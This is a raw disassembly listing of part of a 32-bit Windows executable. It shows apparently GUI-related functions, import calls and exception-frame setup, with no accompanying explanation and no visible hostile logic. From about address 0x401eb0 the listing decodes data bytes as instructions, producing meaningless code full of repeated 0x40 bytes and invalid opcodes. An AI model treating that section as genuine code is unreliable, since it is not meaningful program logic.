  40188a:	push   edx
  40188b:	push   0x101e
  401890:	mov    eax,DWORD PTR [ebp-0x4c]
  401893:	mov    ecx,DWORD PTR [eax+0x20]
  401896:	push   ecx
  401897:	call   DWORD PTR ds:0x41d2d4
  40189d:	mov    DWORD PTR [ebp-0x24],eax
  4018a0:	mov    DWORD PTR [ebp-0x5c],0x0
  4018a7:	mov    edx,DWORD PTR ds:0x41f940
  4018ad:	mov    DWORD PTR [ebp-0x58],edx
  4018b0:	push   0x0
  4018b2:	mov    eax,DWORD PTR [ebp-0x5c]
  4018b5:	push   eax
  4018b6:	push   0x101d
  4018bb:	mov    ecx,DWORD PTR [ebp-0x58]
  4018be:	mov    edx,DWORD PTR [ecx+0x20]
  4018c1:	push   edx
  4018c2:	call   DWORD PTR ds:0x41d2d4
  4018c8:	mov    DWORD PTR [ebp-0x60],eax
  4018cb:	mov    eax,DWORD PTR [ebp-0x60]
  4018ce:	mov    ds:0x41f944,eax
  4018d3:	mov    esp,ebp
  4018d5:	pop    ebp
  4018d6:	ret    
  4018d7:	int3   
  4018d8:	int3   
  4018d9:	int3   
  4018da:	int3   
  4018db:	int3   
  4018dc:	int3   
  4018dd:	int3   
  4018de:	int3   
  4018df:	int3   
  4018e0:	push   ebp
  4018e1:	mov    ebp,esp
  4018e3:	sub    esp,0x14
  4018e6:	mov    DWORD PTR [ebp-0x14],ecx
  4018e9:	mov    eax,DWORD PTR [ebp+0x8]
  4018ec:	push   eax
  4018ed:	mov    ecx,DWORD PTR [ebp-0x14]
  4018f0:	call   0x41cc2c
  4018f5:	cmp    eax,0xffffffff
  4018f8:	jne    0x4018ff
  4018fa:	or     eax,0xffffffff
  4018fd:	jmp    0x40193f
  4018ff:	mov    DWORD PTR [ebp-0x10],0x8c
  401906:	mov    DWORD PTR [ebp-0xc],0x2
  40190d:	mov    DWORD PTR [ebp-0x8],0x64
  401914:	mov    DWORD PTR [ebp-0x4],0x18
  40191b:	push   0x65
  40191d:	mov    ecx,DWORD PTR [ebp-0x14]
  401920:	push   ecx
  401921:	lea    edx,[ebp-0x10]
  401924:	push   edx
  401925:	push   0x50000000
  40192a:	push   0x41e44c
  40192f:	mov    ecx,DWORD PTR [ebp-0x14]
  401932:	add    ecx,0xc0
  401938:	call   0x41cc26
  40193d:	xor    eax,eax
  40193f:	mov    esp,ebp
  401941:	pop    ebp
  401942:	ret    0x4
  401945:	int3   
  401946:	int3   
  401947:	int3   
  401948:	int3   
  401949:	int3   
  40194a:	int3   
  40194b:	int3   
  40194c:	int3   
  40194d:	int3   
  40194e:	int3   
  40194f:	int3   
  401950:	push   ebp
  401951:	mov    ebp,esp
  401953:	push   ecx
  401954:	mov    DWORD PTR [ebp-0x4],ecx
  401957:	mov    esp,ebp
  401959:	pop    ebp
  40195a:	ret    0x4
  40195d:	int3   
  40195e:	int3   
  40195f:	int3   
  401960:	push   ebp
  401961:	mov    ebp,esp
  401963:	push   ecx
  401964:	mov    DWORD PTR [ebp-0x4],ecx
  401967:	mov    esp,ebp
  401969:	pop    ebp
  40196a:	ret    
  40196b:	int3   
  40196c:	int3   
  40196d:	int3   
  40196e:	int3   
  40196f:	int3   
  401970:	push   ebp
  401971:	mov    ebp,esp
  401973:	push   ecx
  401974:	mov    DWORD PTR [ebp-0x4],ecx
  401977:	mov    esp,ebp
  401979:	pop    ebp
  40197a:	ret    0x4
  40197d:	int3   
  40197e:	int3   
  40197f:	int3   
  401980:	push   ebp
  401981:	mov    ebp,esp
  401983:	push   ecx
  401984:	mov    DWORD PTR [ebp-0x4],ecx
  401987:	push   0x0
  401989:	mov    eax,DWORD PTR [ebp-0x4]
  40198c:	mov    ecx,DWORD PTR [eax+0x20]
  40198f:	push   ecx
  401990:	call   DWORD PTR ds:0x41d2d8
  401996:	mov    esp,ebp
  401998:	pop    ebp
  401999:	ret    
  40199a:	int3   
  40199b:	int3   
  40199c:	int3   
  40199d:	int3   
  40199e:	int3   
  40199f:	int3   
  4019a0:	push   ebp
  4019a1:	mov    ebp,esp
  4019a3:	push   ecx
  4019a4:	mov    DWORD PTR [ebp-0x4],ecx
  4019a7:	push   0x1
  4019a9:	mov    eax,DWORD PTR [ebp-0x4]
  4019ac:	mov    ecx,DWORD PTR [eax+0x20]
  4019af:	push   ecx
  4019b0:	call   DWORD PTR ds:0x41d2d8
  4019b6:	mov    esp,ebp
  4019b8:	pop    ebp
  4019b9:	ret    
  4019ba:	int3   
  4019bb:	int3   
  4019bc:	int3   
  4019bd:	int3   
  4019be:	int3   
  4019bf:	int3   
  4019c0:	push   ebp
  4019c1:	mov    ebp,esp
  4019c3:	push   ecx
  4019c4:	mov    DWORD PTR [ebp-0x4],ecx
  4019c7:	mov    ecx,DWORD PTR [ebp-0x4]
  4019ca:	call   0x41cbea
  4019cf:	mov    eax,DWORD PTR [ebp+0x8]
  4019d2:	and    eax,0x1
  4019d5:	test   eax,eax
  4019d7:	je     0x4019e5
  4019d9:	mov    ecx,DWORD PTR [ebp-0x4]
  4019dc:	push   ecx
  4019dd:	call   0x41cc08
  4019e2:	add    esp,0x4
  4019e5:	mov    eax,DWORD PTR [ebp-0x4]
  4019e8:	mov    esp,ebp
  4019ea:	pop    ebp
  4019eb:	ret    0x4
  4019ee:	int3   
  4019ef:	int3   
  4019f0:	push   ebp
  4019f1:	mov    ebp,esp
  4019f3:	call   0x401a00
  4019f8:	call   0x401a10
  4019fd:	pop    ebp
  4019fe:	ret    
  4019ff:	int3   
  401a00:	push   ebp
  401a01:	mov    ebp,esp
  401a03:	mov    ecx,0x41f948
  401a08:	call   0x401a60
  401a0d:	pop    ebp
  401a0e:	ret    
  401a0f:	int3   
  401a10:	push   ebp
  401a11:	mov    ebp,esp
  401a13:	push   0x401a30
  401a18:	call   0x401032
  401a1d:	add    esp,0x4
  401a20:	pop    ebp
  401a21:	ret    
  401a22:	int3   
  401a23:	int3   
  401a24:	int3   
  401a25:	int3   
  401a26:	int3   
  401a27:	int3   
  401a28:	int3   
  401a29:	int3   
  401a2a:	int3   
  401a2b:	int3   
  401a2c:	int3   
  401a2d:	int3   
  401a2e:	int3   
  401a2f:	int3   
  401a30:	push   ebp
  401a31:	mov    ebp,esp
  401a33:	mov    ecx,0x41f948
  401a38:	call   0x401d40
  401a3d:	pop    ebp
  401a3e:	ret    
  401a3f:	int3   
  401a40:	push   ebp
  401a41:	mov    ebp,esp
  401a43:	mov    eax,ds:0x41d1d0
  401a48:	pop    ebp
  401a49:	ret    
  401a4a:	int3   
  401a4b:	int3   
  401a4c:	int3   
  401a4d:	int3   
  401a4e:	int3   
  401a4f:	int3   
  401a50:	push   ebp
  401a51:	mov    ebp,esp
  401a53:	push   ecx
  401a54:	mov    DWORD PTR [ebp-0x4],ecx
  401a57:	mov    eax,0x41f4a0
  401a5c:	mov    esp,ebp
  401a5e:	pop    ebp
  401a5f:	ret    
  401a60:	push   ebp
  401a61:	mov    ebp,esp
  401a63:	push   ecx
  401a64:	mov    DWORD PTR [ebp-0x4],ecx
  401a67:	push   0x0
  401a69:	mov    ecx,DWORD PTR [ebp-0x4]
  401a6c:	call   0x41ccbc
  401a71:	mov    eax,DWORD PTR [ebp-0x4]
  401a74:	mov    DWORD PTR [eax],0x41f540
  401a7a:	mov    eax,DWORD PTR [ebp-0x4]
  401a7d:	mov    esp,ebp
  401a7f:	pop    ebp
  401a80:	ret    
  401a81:	int3   
  401a82:	int3   
  401a83:	int3   
  401a84:	int3   
  401a85:	int3   
  401a86:	int3   
  401a87:	int3   
  401a88:	int3   
  401a89:	int3   
  401a8a:	int3   
  401a8b:	int3   
  401a8c:	int3   
  401a8d:	int3   
  401a8e:	int3   
  401a8f:	int3   
  401a90:	push   ebp
  401a91:	mov    ebp,esp
  401a93:	push   ecx
  401a94:	mov    DWORD PTR [ebp-0x4],ecx
  401a97:	mov    ecx,DWORD PTR [ebp-0x4]
  401a9a:	call   0x401d40
  401a9f:	mov    eax,DWORD PTR [ebp+0x8]
  401aa2:	and    eax,0x1
  401aa5:	test   eax,eax
  401aa7:	je     0x401ab5
  401aa9:	mov    ecx,DWORD PTR [ebp-0x4]
  401aac:	push   ecx
  401aad:	call   0x41cc08
  401ab2:	add    esp,0x4
  401ab5:	mov    eax,DWORD PTR [ebp-0x4]
  401ab8:	mov    esp,ebp
  401aba:	pop    ebp
  401abb:	ret    0x4
  401abe:	int3   
  401abf:	int3   
  401ac0:	push   ebp
  401ac1:	mov    ebp,esp
  401ac3:	push   0xffffffff
  401ac5:	push   0x41ce4e
  401aca:	mov    eax,fs:0x0
  401ad0:	push   eax
  401ad1:	mov    DWORD PTR fs:0x0,esp
  401ad8:	sub    esp,0x68
  401adb:	mov    DWORD PTR [ebp-0x64],ecx
  401ade:	mov    ecx,DWORD PTR [ebp-0x64]
  401ae1:	call   0x41ccec
  401ae6:	push   0x40
  401ae8:	call   0x41cce6
  401aed:	add    esp,0x4
  401af0:	mov    DWORD PTR [ebp-0x24],eax
  401af3:	mov    DWORD PTR [ebp-0x4],0x0
  401afa:	cmp    DWORD PTR [ebp-0x24],0x0
  401afe:	je     0x401b19
  401b00:	mov    ecx,DWORD PTR [ebp-0x24]
  401b03:	call   0x41cbfc
  401b08:	mov    eax,DWORD PTR [ebp-0x24]
  401b0b:	mov    DWORD PTR [eax],0x41f5e4
  401b11:	mov    ecx,DWORD PTR [ebp-0x24]
  401b14:	mov    DWORD PTR [ebp-0x68],ecx
  401b17:	jmp    0x401b20
  401b19:	mov    DWORD PTR [ebp-0x68],0x0
  401b20:	mov    edx,DWORD PTR [ebp-0x68]
  401b23:	mov    DWORD PTR [ebp-0x20],edx
  401b26:	mov    DWORD PTR [ebp-0x4],0xffffffff
  401b2d:	mov    eax,DWORD PTR [ebp-0x20]
  401b30:	mov    ds:0x41f940,eax
  401b35:	push   0x14c
  401b3a:	call   0x41cce6
  401b3f:	add    esp,0x4
  401b42:	mov    DWORD PTR [ebp-0x2c],eax
  401b45:	mov    DWORD PTR [ebp-0x4],0x1
  401b4c:	cmp    DWORD PTR [ebp-0x2c],0x0
  401b50:	je     0x401b5f
  401b52:	mov    ecx,DWORD PTR [ebp-0x2c]
  401b55:	call   0x4015c0
  401b5a:	mov    DWORD PTR [ebp-0x6c],eax
  401b5d:	jmp    0x401b66
  401b5f:	mov    DWORD PTR [ebp-0x6c],0x0
  401b66:	mov    ecx,DWORD PTR [ebp-0x6c]
  401b69:	mov    DWORD PTR [ebp-0x28],ecx
  401b6c:	mov    DWORD PTR [ebp-0x4],0xffffffff
  401b73:	mov    edx,DWORD PTR [ebp-0x28]
  401b76:	mov    DWORD PTR [ebp-0x18],edx
  401b79:	push   0x14c
  401b7e:	call   0x41cce6
  401b83:	add    esp,0x4
  401b86:	mov    DWORD PTR [ebp-0x34],eax
  401b89:	mov    DWORD PTR [ebp-0x4],0x2
  401b90:	cmp    DWORD PTR [ebp-0x34],0x0
  401b94:	je     0x401ba3
  401b96:	mov    ecx,DWORD PTR [ebp-0x34]
  401b99:	call   0x4015c0
  401b9e:	mov    DWORD PTR [ebp-0x70],eax
  401ba1:	jmp    0x401baa
  401ba3:	mov    DWORD PTR [ebp-0x70],0x0
  401baa:	mov    eax,DWORD PTR [ebp-0x70]
  401bad:	mov    DWORD PTR [ebp-0x30],eax
  401bb0:	mov    DWORD PTR [ebp-0x4],0xffffffff
  401bb7:	mov    ecx,DWORD PTR [ebp-0x30]
  401bba:	mov    DWORD PTR [ebp-0x14],ecx
  401bbd:	mov    DWORD PTR [ebp-0x44],0xa
  401bc4:	mov    DWORD PTR [ebp-0x40],0xa
  401bcb:	mov    DWORD PTR [ebp-0x3c],0x2da
  401bd2:	mov    DWORD PTR [ebp-0x38],0x29e
  401bd9:	push   0x0
  401bdb:	push   0x0
  401bdd:	push   0x0
  401bdf:	push   0x0
  401be1:	lea    edx,[ebp-0x44]
  401be4:	push   edx
  401be5:	push   0x80cc0000
  401bea:	push   0x41e45c
  401bef:	push   0x0
  401bf1:	mov    ecx,DWORD PTR [ebp-0x14]
  401bf4:	call   0x41cce0
  401bf9:	mov    DWORD PTR [ebp-0x1c],eax
  401bfc:	cmp    DWORD PTR [ebp-0x1c],0x0
  401c00:	je     0x401c2d
  401c02:	mov    eax,DWORD PTR [ebp-0x14]
  401c05:	mov    DWORD PTR [ebp-0x4c],eax
  401c08:	mov    ecx,DWORD PTR [ebp-0x4c]
  401c0b:	mov    DWORD PTR [ebp-0x48],ecx
  401c0e:	cmp    DWORD PTR [ebp-0x48],0x0
  401c12:	je     0x401c26
  401c14:	push   0x1
  401c16:	mov    edx,DWORD PTR [ebp-0x48]
  401c19:	mov    eax,DWORD PTR [edx]
  401c1b:	mov    ecx,DWORD PTR [ebp-0x48]
  401c1e:	call   DWORD PTR [eax+0x4]
  401c21:	mov    DWORD PTR [ebp-0x74],eax
  401c24:	jmp    0x401c2d
  401c26:	mov    DWORD PTR [ebp-0x74],0x0
  401c2d:	mov    DWORD PTR [ebp-0x5c],0xa
  401c34:	mov    DWORD PTR [ebp-0x58],0xa
  401c3b:	mov    DWORD PTR [ebp-0x54],0x2da
  401c42:	mov    DWORD PTR [ebp-0x50],0x29e
  401c49:	push   0x0
  401c4b:	push   0x0
  401c4d:	push   0x0
  401c4f:	push   0x0
  401c51:	lea    ecx,[ebp-0x5c]
  401c54:	push   ecx
  401c55:	push   0x80cc0000
  401c5a:	push   0x41e454
  401c5f:	push   0x0
  401c61:	mov    ecx,DWORD PTR [ebp-0x18]
  401c64:	call   0x41cce0
  401c69:	mov    DWORD PTR [ebp-0x10],eax
  401c6c:	call   0x41ccda
  401c71:	mov    edx,DWORD PTR [eax+0x8]
  401c74:	mov    DWORD PTR [ebp-0x60],edx
  401c77:	mov    eax,DWORD PTR [ebp-0x60]
  401c7a:	mov    ds:0x41dd13,eax
  401c7f:	mov    ecx,DWORD PTR [ebp-0x18]
  401c82:	mov    edx,DWORD PTR [ecx]
  401c84:	mov    ecx,DWORD PTR [ebp-0x18]
  401c87:	call   DWORD PTR [edx+0xfc]
  401c8d:	mov    eax,DWORD PTR [ebp-0x18]
  401c90:	mov    edx,DWORD PTR [eax]
  401c92:	mov    ecx,DWORD PTR [ebp-0x18]
  401c95:	call   DWORD PTR [edx+0x60]
  401c98:	mov    ecx,0x41f948
  401c9d:	call   0x41cc74
  401ca2:	mov    eax,DWORD PTR [ebp-0x64]
  401ca5:	mov    ecx,DWORD PTR [ebp-0x18]
  401ca8:	mov    DWORD PTR [eax+0x20],ecx
  401cab:	xor    eax,eax
  401cad:	mov    ecx,DWORD PTR [ebp-0xc]
  401cb0:	mov    DWORD PTR fs:0x0,ecx
  401cb7:	mov    esp,ebp
  401cb9:	pop    ebp
  401cba:	ret    
  401cbb:	int3   
  401cbc:	int3   
  401cbd:	int3   
  401cbe:	int3   
  401cbf:	int3   
  401cc0:	push   ebp
  401cc1:	mov    ebp,esp
  401cc3:	push   ecx
  401cc4:	mov    DWORD PTR [ebp-0x4],ecx
  401cc7:	push   0x0
  401cc9:	push   0x64
  401ccb:	mov    ecx,DWORD PTR [ebp-0x4]
  401cce:	call   0x41cd34
  401cd3:	mov    eax,DWORD PTR [ebp-0x4]
  401cd6:	mov    DWORD PTR [eax],0x41f6a8
  401cdc:	mov    eax,DWORD PTR [ebp-0x4]
  401cdf:	mov    esp,ebp
  401ce1:	pop    ebp
  401ce2:	ret    
  401ce3:	int3   
  401ce4:	int3   
  401ce5:	int3   
  401ce6:	int3   
  401ce7:	int3   
  401ce8:	int3   
  401ce9:	int3   
  401cea:	int3   
  401ceb:	int3   
  401cec:	int3   
  401ced:	int3   
  401cee:	int3   
  401cef:	int3   
  401cf0:	push   ebp
  401cf1:	mov    ebp,esp
  401cf3:	push   ecx
  401cf4:	mov    DWORD PTR [ebp-0x4],ecx
  401cf7:	mov    ecx,DWORD PTR [ebp-0x4]
  401cfa:	call   0x401d20
  401cff:	mov    eax,DWORD PTR [ebp+0x8]
  401d02:	and    eax,0x1
  401d05:	test   eax,eax
  401d07:	je     0x401d15
  401d09:	mov    ecx,DWORD PTR [ebp-0x4]
  401d0c:	push   ecx
  401d0d:	call   0x41cc08
  401d12:	add    esp,0x4
  401d15:	mov    eax,DWORD PTR [ebp-0x4]
  401d18:	mov    esp,ebp
  401d1a:	pop    ebp
  401d1b:	ret    0x4
  401d1e:	int3   
  401d1f:	int3   
  401d20:	push   ebp
  401d21:	mov    ebp,esp
  401d23:	push   ecx
  401d24:	mov    DWORD PTR [ebp-0x4],ecx
  401d27:	mov    ecx,DWORD PTR [ebp-0x4]
  401d2a:	call   0x41cd3a
  401d2f:	mov    esp,ebp
  401d31:	pop    ebp
  401d32:	ret    
  401d33:	int3   
  401d34:	int3   
  401d35:	int3   
  401d36:	int3   
  401d37:	int3   
  401d38:	int3   
  401d39:	int3   
  401d3a:	int3   
  401d3b:	int3   
  401d3c:	int3   
  401d3d:	int3   
  401d3e:	int3   
  401d3f:	int3   
  401d40:	push   ebp
  401d41:	mov    ebp,esp
  401d43:	push   0xffffffff
  401d45:	push   0x41ce69
  401d4a:	mov    eax,fs:0x0
  401d50:	push   eax
  401d51:	mov    DWORD PTR fs:0x0,esp
  401d58:	sub    esp,0x10
  401d5b:	push   ebx
  401d5c:	push   esi
  401d5d:	push   edi
  401d5e:	mov    DWORD PTR [ebp-0x18],ecx
  401d61:	mov    eax,DWORD PTR [ebp-0x18]
  401d64:	mov    DWORD PTR [eax],0x41f540
  401d6a:	mov    DWORD PTR [ebp-0x4],0x0
  401d71:	mov    ecx,DWORD PTR [ebp-0x18]
  401d74:	mov    edx,DWORD PTR [ecx+0x20]
  401d77:	mov    DWORD PTR [ebp-0x14],edx
  401d7a:	mov    eax,DWORD PTR [ebp-0x14]
  401d7d:	mov    DWORD PTR [ebp-0x10],eax
  401d80:	cmp    DWORD PTR [ebp-0x10],0x0
  401d84:	je     0x401d98
  401d86:	push   0x1
  401d88:	mov    ecx,DWORD PTR [ebp-0x10]
  401d8b:	mov    edx,DWORD PTR [ecx]
  401d8d:	mov    ecx,DWORD PTR [ebp-0x10]
  401d90:	call   DWORD PTR [edx+0x4]
  401d93:	mov    DWORD PTR [ebp-0x1c],eax
  401d96:	jmp    0x401d9f
  401d98:	mov    DWORD PTR [ebp-0x1c],0x0
  401d9f:	mov    eax,ds:0x41f944
  401da4:	inc    DWORD PTR ds:0x41f944
  401daa:	call   0x401330
  401daf:	mov    DWORD PTR [ebp-0x4],0xffffffff
  401db6:	mov    ecx,DWORD PTR [ebp-0x18]
  401db9:	call   0x41cd40
  401dbe:	mov    ecx,DWORD PTR [ebp-0xc]
  401dc1:	mov    DWORD PTR fs:0x0,ecx
  401dc8:	pop    edi
  401dc9:	pop    esi
  401dca:	pop    ebx
  401dcb:	mov    esp,ebp
  401dcd:	pop    ebp
  401dce:	ret    
  401dcf:	int3   
  401dd0:	push   ebp
  401dd1:	mov    ebp,esp
  401dd3:	push   ecx
  401dd4:	mov    DWORD PTR [ebp-0x4],ecx
  401dd7:	mov    esp,ebp
  401dd9:	pop    ebp
  401dda:	ret    0x4
  401ddd:	int3   
  401dde:	int3   
  401ddf:	int3   
  401de0:	push   ebp
  401de1:	mov    ebp,esp
  401de3:	mov    eax,ds:0x41d280
  401de8:	pop    ebp
  401de9:	ret    
  401dea:	int3   
  401deb:	int3   
  401dec:	int3   
  401ded:	int3   
  401dee:	int3   
  401def:	int3   
  401df0:	push   ebp
  401df1:	mov    ebp,esp
  401df3:	push   ecx
  401df4:	mov    DWORD PTR [ebp-0x4],ecx
  401df7:	mov    eax,0x41f520
  401dfc:	mov    esp,ebp
  401dfe:	pop    ebp
  401dff:	ret    
  401e00:	push   ebp
  401e01:	mov    ebp,esp
  401e03:	push   0xffffffff
  401e05:	push   0x41ce89
  401e0a:	mov    eax,fs:0x0
  401e10:	push   eax
  401e11:	mov    DWORD PTR fs:0x0,esp
  401e18:	sub    esp,0x64
  401e1b:	mov    DWORD PTR [ebp-0x70],ecx
  401e1e:	lea    ecx,[ebp-0x6c]
  401e21:	call   0x401cc0
  401e26:	mov    DWORD PTR [ebp-0x4],0x0
  401e2d:	lea    ecx,[ebp-0x6c]
  401e30:	call   0x41cd10
  401e35:	mov    DWORD PTR [ebp-0x4],0xffffffff
  401e3c:	lea    ecx,[ebp-0x6c]
  401e3f:	call   0x41cd3a
  401e44:	mov    ecx,DWORD PTR [ebp-0xc]
  401e47:	mov    DWORD PTR fs:0x0,ecx
  401e4e:	mov    esp,ebp
  401e50:	pop    ebp
  401e51:	ret    
  401e52:	int3   
  401e53:	int3   
  401e54:	int3   
  401e55:	int3   
  401e56:	int3   
  401e57:	int3   
  401e58:	int3   
  401e59:	int3   
  401e5a:	int3   
  401e5b:	int3   
  401e5c:	int3   
  401e5d:	int3   
  401e5e:	int3   
  401e5f:	int3   
  401e60:	push   ebp
  401e61:	mov    ebp,esp
  401e63:	mov    eax,DWORD PTR [ebp+0x8]
  401e66:	push   eax
  401e67:	call   0x41cc08
  401e6c:	add    esp,0x4
  401e6f:	pop    ebp
  401e70:	ret    0x4
  401e73:	int3   
  401e74:	int3   
  401e75:	int3   
  401e76:	int3   
  401e77:	int3   
  401e78:	int3   
  401e79:	int3   
  401e7a:	int3   
  401e7b:	int3   
  401e7c:	int3   
  401e7d:	int3   
  401e7e:	int3   
  401e7f:	int3   
  401e80:	push   ebp
  401e81:	mov    ebp,esp
  401e83:	push   ecx
  401e84:	mov    DWORD PTR [ebp-0x4],ecx
  401e87:	mov    ecx,DWORD PTR [ebp-0x4]
  401e8a:	call   0x41cd46
  401e8f:	mov    eax,DWORD PTR [ebp+0x8]
  401e92:	and    eax,0x1
  401e95:	test   eax,eax
  401e97:	je     0x401ea5
  401e99:	mov    ecx,DWORD PTR [ebp-0x4]
  401e9c:	push   ecx
  401e9d:	call   0x41cc08
  401ea2:	add    esp,0x4
  401ea5:	mov    eax,DWORD PTR [ebp-0x4]
  401ea8:	mov    esp,ebp
  401eaa:	pop    ebp
  401eab:	ret    0x4
  401eae:	int3   
  401eaf:	int3   
  401eb0:	inc    eax
  401eb1:	sbb    ah,BYTE PTR [eax]
  401eb3:	in     eax,0x62
  401eb5:	adc    DWORD PTR ds:0x2f404086,ecx
  401ebb:	jne    0x401f1f
  401ebd:	add    cl,BYTE PTR [edx+0x33]
  401ec0:	push   ecx
  401ec1:	push   ecx
  401ec2:	dec    edx
  401ec3:	xor    BYTE PTR [edx],bh
  401ec5:	dec    esp
  401ec6:	sub    bl,BYTE PTR [esi+0x2ae95140]
  401ecc:	test   al,0xcd
  401ece:	inc    eax
  401ecf:	add    eax,0x40404040
  401ed4:	inc    eax
  401ed5:	inc    eax
  401ed6:	inc    eax
  401ed7:	inc    eax
  401ed8:	inc    DWORD PTR [eax+0x40]
  401edb:	mov    edi,0x5440b490
  401ee0:	xchg   ecx,eax
  401ee1:	xchg   BYTE PTR [eax+0x51],al
  401ee4:	arpl   di,cx
  401ee6:	inc    eax
  401ee7:	add    eax,0x40404053
  401eec:	inc    eax
  401eed:	inc    eax
  401eee:	inc    eax
  401eef:	inc    eax
  401ef0:	inc    eax
  401ef1:	inc    eax
  401ef2:	inc    eax
  401ef3:	xor    eax,0x47bbfb40
  401ef8:	inc    eax
  401ef9:	retf   
  401efa:	ficomp DWORD PTR [ebp+0x2d6f5c40]
  401f00:	into   
  401f01:	add    DWORD PTR [edx+0x5],edx
  401f04:	inc    eax
  401f05:	push   ecx
  401f06:	popa   
  401f07:	test   BYTE PTR [esp+edx*2+0x67],al
  401f0b:	xchg   BYTE PTR [eax+0xc],al
  401f0e:	pop    cx
  401f10:	inc    esi
  401f11:	int    0x3c
  401f13:	cmp    BYTE PTR [eax+0x38],al
  401f16:	inc    eax
  401f17:	inc    eax
  401f18:	inc    eax
  401f19:	inc    eax
  401f1a:	inc    eax
  401f1b:	inc    eax
  401f1c:	inc    eax
  401f1d:	inc    eax
  401f1e:	add    BYTE PTR [ecx],ah
  401f20:	(bad)  
  401f22:	mov    ah,0x45
  401f24:	pushf  
  401f25:	inc    eax
  401f26:	or     DWORD PTR [edi+0x49],edi
  401f29:	pop    ebp
  401f2a:	or     eax,0x45400540
  401f2f:	mov    eax,ds:0xb94cd411
  401f34:	xchg   BYTE PTR [eax+0x31],al
  401f37:	inc    ebp
  401f38:	cli    
  401f39:	cmp    dh,BYTE PTR [ecx]
  401f3b:	outs   dx,BYTE PTR ds:[esi]
  401f3c:	and    eax,0x40a34940
  401f41:	inc    eax
  401f42:	inc    eax
  401f43:	inc    eax
  401f44:	inc    eax
  401f45:	inc    eax
  401f46:	and    eax,0xae404040
  401f4b:	repnz cmp BYTE PTR [ebx+ebx*4+0x40],dl
  401f50:	mov    cl,0x3
  401f52:	dec    esi
  401f53:	fst    DWORD PTR [edx]
  401f55:	inc    eax
  401f56:	add    eax,0x21a5bb40
  401f5b:	xor    DWORD PTR [ecx],eax
  401f5d:	stc    
  401f5e:	xchg   BYTE PTR [eax+0x5f],al
  401f61:	les    ebp,FWORD PTR [eax+esi*1+0x40]
  401f65:	inc    eax
  401f66:	inc    eax
  401f67:	inc    eax
  401f68:	inc    eax
  401f69:	inc    eax
  401f6a:	inc    eax
  401f6b:	inc    eax
  401f6c:	inc    eax
  401f6d:	inc    eax
  401f6e:	push   esp
  401f6f:	outs   dx,DWORD PTR ds:[esi]
  401f70:	sub    al,0x40
  401f72:	adc    DWORD PTR [eax-0x8329bc9],ebp
  401f78:	call   0xbc40:0x47294140
  401f7f:	dec    edi
  401f80:	add    eax,0x707ed140
  401f85:	arpl   WORD PTR ds:0x5a408650,cx
  401f8b:	and    eax,0x404040d6
  401f90:	inc    eax
  401f91:	inc    eax
  401f92:	inc    eax
  401f93:	rol    DWORD PTR [eax+0x40],0x75
  401f97:	retf   
  401f98:	pop    esp
  401f99:	and    DWORD PTR [eax-0x6d],eax
  401f9c:	mov    ebp,0xfbb0dc40
  401fa1:	cdq    
  401fa2:	inc    eax
  401fa3:	dec    esp
  401fa4:	outs   dx,DWORD PTR ds:[esi]
  401fa5:	inc    eax
  401fa6:	inc    DWORD PTR [ebp+0x52]
  401fa9:	add    eax,0x7c219140
  401fae:	dec    esp
  401faf:	inc    ebx
  401fb0:	sub    eax,DWORD PTR [esi+0x40407640]
  401fb6:	add    BYTE PTR [eax+0x40],al
  401fb9:	inc    eax
  401fba:	inc    eax
  401fbb:	inc    eax
  401fbc:	inc    eax
  401fbd:	sub    BYTE PTR [eax-0x5b],al
  401fc0:	aam    0x33
  401fc2:	sub    DWORD PTR [eax-0x6f],eax
  401fc5:	gs inc eax
  401fc7:	addr16 mov al,ds:0x98c9
  401fcb:	inc    eax
  401fcc:	jp     0x40200e
  401fce:	inc    eax
  401fcf:	inc    eax
  401fd0:	inc    eax
  401fd1:	inc    eax
  401fd2:	inc    eax
  401fd3:	inc    eax
  401fd4:	inc    eax
  401fd5:	inc    eax
  401fd6:	inc    eax
  401fd7:	sbb    eax,DWORD PTR [eax+0x59]
  401fda:	inc    eax
  401fdb:	inc    ebp
  401fdc:	add    eax,0x4027d540
  401fe1:	les    esi,FWORD PTR ds:0x40404038
  401fe7:	inc    eax
  401fe8:	inc    eax
  401fe9:	inc    eax
  401fea:	int3   
  401feb:	jne    0x40202d
  401fed:	xchg   BYTE PTR [eax+0x4a],al
  401ff0:	and    eax,DWORD PTR [eax+0x23]
  401ff3:	push   0xd7402bf8
  401ff8:	in     eax,0x40
  401ffa:	fiadd  WORD PTR [eax+0x34]
  401ffd:	xchg   edi,eax
  401ffe:	inc    eax
  401fff:	pop    edx
  402000:	push   esi
  402001:	inc    eax
  402002:	test   al,0x79
  402004:	mov    es,WORD PTR ds:0x40c10040
  40200a:	inc    eax
  40200b:	inc    eax
  40200c:	inc    eax
  40200d:	add    BYTE PTR [eax+0x40],al
  402010:	aad    0xe1
  402012:	inc    eax
  402013:	dec    esp
  402014:	mov    ch,0xc
  402016:	xchg   BYTE PTR [eax-0x41],al
  402019:	loope  0x40205c
  40201b:	inc    ecx
  40201c:	bound  ebp,QWORD PTR [eax+0x64404029]
  402022:	lods   al,BYTE PTR ds:[esi]
  402023:	imul   ecx,ebp,0x50
  402026:	inc    eax
  402027:	inc    eax
  402028:	inc    eax
  402029:	inc    eax
  40202a:	inc    eax
  40202b:	inc    eax
  40202c:	inc    eax
  40202d:	inc    eax
  40202e:	inc    DWORD PTR [eax-0x6a]
  402031:	inc    eax
  402032:	mov    ch,0x33
  402034:	sbb    edi,DWORD PTR [eax]
  402036:	mov    ah,0xf1
  402038:	add    eax,0x60e55240
  40203d:	arpl   WORD PTR ds:0x714086a0,dx
  402043:	and    eax,0x15cb6140
  402048:	and    DWORD PTR [eax+0x6e],eax
  40204b:	mov    ebp,0xcbb88024
  402050:	xchg   ebp,eax
  402051:	inc    eax
  402052:	icebp  
  402053:	pop    ecx
  402054:	pop    ebp
  402055:	arpl   WORD PTR ds:0x40404040,cx
  40205b:	inc    eax
  40205c:	inc    eax
  40205d:	inc    eax
  40205e:	inc    eax
  40205f:	inc    eax
  402060:	inc    eax
  402061:	pushf  
  402062:	add    eax,0x62215540
  402067:	and    al,0xcb
  402069:	add    eax,0x3c1d4086
  40206e:	fcom   QWORD PTR gs:[eax]
  402071:	retf   
  402072:	sub    eax,DWORD PTR [eax+0xa]
  402075:	inc    eax
  402076:	inc    eax
  402077:	inc    eax
  402078:	inc    eax
  402079:	inc    eax
  40207a:	inc    eax
  40207b:	inc    eax
  40207c:	inc    eax
  40207d:	add    BYTE PTR [ecx+0x48504060],ah
  402083:	xchg   esp,eax
  402084:	inc    eax
  402085:	jns    0x4020ee
  402087:	jp     0x402045
  402089:	inc    esi
  40208a:	inc    ebx
  40208b:	add    eax,0x28224c40
